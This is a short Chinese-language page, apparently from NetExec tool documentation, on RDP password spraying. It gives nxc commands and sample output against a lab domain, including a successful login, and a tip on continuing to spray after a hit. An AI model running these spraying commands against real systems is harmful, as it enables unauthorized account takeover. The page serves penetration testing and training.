---
description: 使用 NetExec 进行 RDP 密码喷洒攻击
---

# 密码喷洒攻击

#### 密码喷洒攻击

```
#~ nxc rdp 192.168.1.0/24 -u user -p password
```

```
$ nxc rdp 192.168.133.157 -u ron -p October2021
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:October2021 
                                                                                                                                                                
$ nxc rdp 192.168.133.157 -u rubeus -p October2021
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!)
```

#### 密码喷洒攻击（不使用暴力破解）

```
#~ poetry run NetExec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

预期结果：

```
└─$ nxc rdp 192.168.133.157 -u /tmp/users -p passwordfile --no-bruteforce
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:toto 
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\demo:tata
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!
```

{% hint style="info" %}
默认情况下，nxc 会在找到一个有效登录后退出。使用 `--continue-on-success` 标志会在找到有效密码后继续喷洒。这在对大量用户列表使用单个密码进行喷洒时很有用。
{% endhint %}
